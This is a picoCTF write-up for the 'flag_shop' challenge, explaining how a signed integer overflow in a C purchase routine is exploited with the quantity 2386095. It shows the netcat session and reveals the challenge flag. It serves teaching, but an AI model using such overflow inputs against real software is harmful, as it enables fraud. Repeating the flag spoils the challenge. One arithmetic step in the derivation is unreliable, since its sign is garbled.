# flag_shop
Points: 300

## Table of Contents
  * [Description](#description)
  * [Hints](#hints)
  * [Solution](#solution)
    * [**Vulnerable code block**](#vulnerable-code-block)
    * [**The vulnerability**](#the-vulnerability)
    * [**Exploiting the vulnerability**](#exploiting-the-vulnerability)
    * [**Input justification**](#input-justification)
  * [Flag](#flag)
  
## Description
There's a flag shop selling stuff, can you buy a flag? [Source](files/store.c). Connect with ```nc jupiter.challenges.picoctf.org 44566```.

## Hints
1. <details>
    <summary>Hint 1</summary>
    Two's compliment can do some weird things when numbers get really big!
    </details>

## Solution

### **Vulnerable code block**
From the given [source code](files/store.c), it seems that the following code block contains a vulnerability that we can exploit to purchase the flag.

```C
int number_flags = 0;
fflush(stdin);
scanf("%d", &number_flags);
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour current balance after transaction: %d\n\n", account_balance);
    }
    else{
        printf("Not enough funds to complete purchase\n");
    }
```

Although it makes sure that ```number_flags``` cannot be negative, it simply multiplies ```number_flags``` by ```900``` to compute ```total_cost``` without further validation. This operation can lead to an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability.

### **The vulnerability**
```int``` datatype in C has an upper limit, which is [2147483647]([2147483647](https://www.geeksforgeeks.org/int_max-int_min-cc-applications/)) or ```(2^31) - 1```. If we have the following program

```C
int main() {
  int i = 2147483647;
  i++; // add 1 to the upper limit
  printf("%d", i);
  return 0;
}
```

It will print ```-2147483648```, which is the lower limit of ```int``` datatype in C, since adding to the upper limit causes the program to wrap around to the lower limit.

### **Exploiting the vulnerability**
One solution is to input the following number for ```number_flags``` (the number is computed with Python)

```Python
>>> round(((2**31) / 900) + 2)
2386095
```

Our main goal here is to make ```total_cost``` a negative number and make ```account_balance``` a large positive number.

### **Input justification**
Here, ```(2^31) / 900``` will pass the first check ```if(number_flags > 0)``` as it is a positive number and it does not exceed the upper limit of ```int```. 

When it is multiplied by 900 to compute the total cost,

```(2^31) / 900 * 900 = (2^31)```

It will return ```(2^31)```, which is greater than the upper limit ```(2^31)-1``` and thus, it will return the lower limit due to the overflow. This makes ```total_cost``` negative.

However, in the program, we start with ```int account_balance = 1100;```. If we simply use ```(2^31) / 900```, the following code will make ``` account_balance``` to be ```-(2^31)+1100``` that will not overflow to become a large positive number since it does not exceed the lower limit.

```account_balance = account_balance - total_cost;```

Therefore, the ```+ 2``` in ```((2**31) / 900) + 2``` can be used to cancel out ```1100```.

```total_cost = (((2**31) / 900) + 2) * 900```

```total_cost = (2**31) + 1800```

```(2**31)``` will overflow to become ```-(2**31)```

```account_balance = 1100 - (-(2**31) + 1800)```

```account_balance = -(2**31) - 700```

which will overflow to be a large positive integer.

```
$ nc jupiter.challenges.picoctf.org 44566
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896
```

Finally, we can purchase the actual flag.

```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: *****
```

## Flag
<details>
  <summary>Flag</summary>
  picoCTF{m0n3y_bag5_68d16363}
</details>